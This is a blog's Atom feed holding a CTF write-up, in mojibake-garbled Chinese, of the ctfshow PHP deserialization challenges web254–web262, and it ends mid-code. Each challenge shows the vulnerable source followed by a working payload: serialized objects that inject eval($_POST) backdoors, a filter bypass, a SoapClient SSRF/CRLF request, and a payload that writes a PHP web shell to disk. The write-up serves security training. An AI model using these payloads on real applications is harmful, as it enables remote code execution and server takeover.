<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xinyuan&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/cb5dd586f32c8841e8838c89301eb7fa</icon>
  <subtitle>é‘«ç¼˜çš„blog</subtitle>
  <link href="http://websec.space/atom.xml" rel="self"/>
  
  <link href="http://websec.space/"/>
  <updated>2022-03-12T08:36:29.971Z</updated>
  <id>http://websec.space/</id>
  
  <author>
    <name>é‘«ç¼˜</name>
    <email>xy_404@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctfshowååºåˆ—åŒ–</title>
    <link href="http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://websec.space/2022/03/12/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-03-11T16:00:00.000Z</published>
    <updated>2022-03-12T08:36:29.971Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshowååºåˆ—åŒ–"><a href="#ctfshowååºåˆ—åŒ–" class="headerlink" title="ctfshowååºåˆ—åŒ–"></a>ctfshowååºåˆ—åŒ–</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;</span><br><span class="line">            $this-&gt;isVip=true;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = new ctfShowUser();</span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»æ‡‚ä»£ç æ„æ€å³å¯æ¯”è¾ƒç®€å•</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxx&amp;passowrd=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo &quot;your flag is &quot;.$flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–ä¸‹é¢ä¸€æ®µä»£ç ï¼Œå³åºåˆ—åŒ–ä¸€æ®µå†…å®¹å°†$isVip=true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>è¿˜è¦è®¾ç½®ä¸€ä¸‹usernameå’Œpassword</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line"></span><br><span class="line">    public function checkVip()&#123;</span><br><span class="line">        return $this-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function vipOneKeyGetFlag()&#123;</span><br><span class="line">        if($this-&gt;isVip)&#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            if($this-&gt;username!==$this-&gt;password)&#123;</span><br><span class="line">                    echo &quot;your flag is &quot;.$flag;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;no vip, no flag&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    </span><br><span class="line">    if($user-&gt;login($username,$password))&#123;</span><br><span class="line">        if($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;no vip,no flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤šäº†ä¸€ä¸ªåˆ¤æ–­$this-&gt;username!==$this-&gt;password</p><p>åºåˆ—åŒ–çš„å¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22xxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=xxxxxx&amp;password=xxxx</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    private $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    private $isVip=false;</span><br><span class="line">    private $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    private $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    private $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†æ„é€ å‡½æ•° new infoæ”¹ä¸ºbackDoor</p><p>ç„¶åå°†backDoorç±»ä¸­çš„codeæ”¹ä¸ºeval($_POST[1]);</p><p>åºåˆ—åŒ–åæˆåŠŸrce</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfShowUser&#123;</span><br><span class="line">    public $username=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $password=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public $isVip=false;</span><br><span class="line">    public $class = &#x27;info&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;class=new info();</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($u,$p)&#123;</span><br><span class="line">        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class info&#123;</span><br><span class="line">    public $user=&#x27;xxxxxx&#x27;;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        return $this-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class backDoor&#123;</span><br><span class="line">    public $code;</span><br><span class="line">    public function getInfo()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[&#x27;username&#x27;];</span><br><span class="line">$password=$_GET[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($username) &amp;&amp; isset($password))&#123;</span><br><span class="line">    if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;</span><br><span class="line">        $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">    $user-&gt;login($username,$password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ äº†è¿‡æ»¤ï¼Œæ‰€ä»¥å°†O:10: æ”¹æˆO:+10:å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="web259-call"><a href="#web259-call" class="headerlink" title="web259(__call())"></a>web259(__call())</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$vip = unserialize($_GET[&#x27;vip&#x27;]);</span><br><span class="line">//vip can get flag one key</span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure><blockquote><p>flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">array_pop($xff);</span><br><span class="line">$ip = array_pop($xff);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($ip!==&#x27;127.0.0.1&#x27;)&#123;</span><br><span class="line">die(&#x27;error&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$token = $_POST[&#x27;token&#x27;];</span><br><span class="line">if($token==&#x27;ctfshow&#x27;)&#123;</span><br><span class="line">file_put_contents(&#x27;flag.txt&#x27;,$flag);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å› ä¸ºgetflagæœªçŸ¥ï¼Œ<code>__call()</code>æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­çš„ä¸èƒ½ç”¨çš„æ–¹æ³•çš„æ—¶å€™å°±å›æ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public __call ( string $name , array $arguments )</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ„é€ ä¸€ä¸ªclassåˆ©ç”¨å…¶__callæ–¹æ³•ä¼ å‚</p><p>payload.php:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $ua=&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">    $client= new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http:127.0.0.1&#x27;,&#x27;location&#x27;=&gt;&#x27;http://127.0.0.1/flag.php&#x27;,&#x27;user_agent&#x27;=&gt;$ua));</span><br><span class="line"></span><br><span class="line">    $ser=urlencode(serialize($client));</span><br><span class="line">    echo $ser;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ²¡ä»€ä¹ˆå¯è¯´çš„ï¼Œç›´æ¥æ‘†ä¸Šå°±è¡Œäº†</p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshowvip&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $code;</span><br><span class="line"></span><br><span class="line">    public function __construct($u,$p)&#123;</span><br><span class="line">        $this-&gt;username=$u;</span><br><span class="line">        $this-&gt;password=$p;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;</span><br><span class="line">            die(&#x27;error&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        $this-&gt;username=&#x27;&#x27;;</span><br><span class="line">        $this-&gt;password=&#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __unserialize($data)&#123;</span><br><span class="line">        $this-&gt;username=$data[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$data[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;code = $this-&gt;username.$this-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;code==0x36d)&#123;</span><br><span class="line">            file_put_contents($this-&gt;username, $this-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&#x27;vip&#x27;]);</span><br></pre></td></tr></table></figure><p>ç‰ˆæœ¬é—®é¢˜ï¼Œç”±äºæœ‰__unserializeï¼Œçš„å­˜åœ¨æ˜¯ä¸æ‰§è¡Œ__wakeupæ–¹æ³•çš„ï¼Œæ‰€ä»¥ç›´æ¥æ§åˆ¶è¿™ä¸ªé”€æ¯æ–¹æ³•å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class ctfshowvip&#123;</span><br><span class="line">        public $username;</span><br><span class="line">        public $password;</span><br><span class="line">        public $code;</span><br><span class="line">    </span><br><span class="line">        public function __construct($u=&#x27;&#x27;,$p=&#x27;&#x27;)&#123;</span><br><span class="line">            $this-&gt;username=&quot;877.php&quot;;</span><br><span class="line">            $this-&gt;password=&#x27;&lt;?php eval($_POST[a]); ?&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–åå†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A25%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B+%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><h2 id="web262-å­—ç¬¦é€ƒé€¸"><a href="#web262-å­—ç¬¦é€ƒé€¸" class="headerlink" title="web262(å­—ç¬¦é€ƒé€¸)"></a>web262(å­—ç¬¦é€ƒé€¸)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">class message&#123;</span><br><span class="line">    public $from;</span><br><span class="line">    public $msg;</span><br><span class="line">    public $to;</span><br><span class="line">    public $token=&#x27;user&#x27;;</span><br><span class="line">    public function __construct($f,$m,$t)&#123;</span><br><span class="line">        $this-&gt;from = $f;</span><br><span class="line">        $this-&gt;msg = $m;</span><br><span class="line">        $this-&gt;to = $t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f = $_GET[&#x27;f&#x27;];</span><br><span class="line">$m = $_GET[&#x27;m&#x27;];</span><br><span class="line">$t = $_GET[&#x27;t&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;</span><br><span class="line">    $msg = new message($f,$m,$t);</span><br><span class="line">    $umsg = str_replace(&#x27;fuck&#x27;, 